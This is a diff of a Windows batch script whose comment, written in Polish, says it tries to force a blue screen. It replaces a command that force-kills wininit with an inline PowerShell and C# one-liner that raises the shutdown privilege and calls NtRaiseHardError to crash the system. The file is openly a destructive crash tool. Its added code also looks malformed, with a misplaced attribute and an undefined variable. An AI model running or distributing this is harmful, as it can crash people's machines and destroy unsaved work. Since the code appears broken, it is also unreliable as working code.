@@ -1,5 +1,2 @@
 @echo off
-echo Proba wymuszenia BSOD...
-:: Uruchomienie z uprawnieniami Systemu do zabicia procesu bez pytania
-powershell -Command "Stop-Process -Name wininit -Force"
-pause
+powershell -Command "$p=[System.Diagnostics.Process]::Start('powershell','-Command \"Add-Type -TypeDefinition ''using System;[DllImport(\"\"ntdll.dll\"\")]public class B{[DllImport(\"\"ntdll.dll\"\")]public static extern uint RtlAdjustPrivilege(int p,bool e,bool c,out bool a);[DllImport(\"\"ntdll.dll\"\")]public static extern uint NtRaiseHardError(uint s,uint n,uint u,IntPtr p,uint v,out uint r);}'' ; $a=$false; [B]::RtlAdjustPrivilege(19,$true,$false,[ref]$a); [B]::NtRaiseHardError(0xC0000022,0,0,[IntPtr]::Zero,6,$ref)\"')"
